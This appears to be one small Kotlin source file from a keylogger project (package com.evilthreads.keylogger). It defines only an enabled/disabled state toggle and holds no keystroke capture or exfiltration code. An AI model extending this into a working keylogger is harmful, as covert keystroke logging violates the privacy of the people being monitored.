package com.evilthreads.keylogger

object KeyloggerState{
    private var state = State.DISABLED

    fun disable(){
        state = State.DISABLED
    }

    fun enabled(){
        state = State.ENABLED
    }

    fun isEnabled(): Boolean{
        return state == State.ENABLED
    }
}

enum class State{
    ENABLED, DISABLED
}